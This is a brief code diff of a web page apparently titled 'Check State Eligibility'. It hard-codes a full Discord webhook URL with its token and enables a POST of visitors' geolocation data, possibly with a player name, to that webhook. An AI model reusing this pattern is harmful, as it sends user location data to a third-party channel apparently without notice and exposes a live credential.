@@ -232,7 +232,7 @@ Check State Eligibility
 
 /* CONFIG */
 
-const webhookURL="YOUR_DISCORD_WEBHOOK_URL"
+const webhookURL="https://discord.com/api/webhooks/1479275580506509482/p31OYAKnFPI9-LvOyagDqsb3ZcHNxNQHlQgeoKtD63Zn2XloxHrelQhjCVA4ein4selZ"
 
 /* STATE */
 
@@ -372,7 +372,7 @@ localStorage.setItem("chosenName",playerName)
 
 /* Webhook */
 
-if(geoData && webhookURL!=="https://discord.com/api/webhooks/1479275580506509482/p31OYAKnFPI9-LvOyagDqsb3ZcHNxNQHlQgeoKtD63Zn2XloxHrelQhjCVA4ein4selZ"){
+if(geoData && webhookURL){
 
 await fetch(webhookURL,{
 method:"POST",
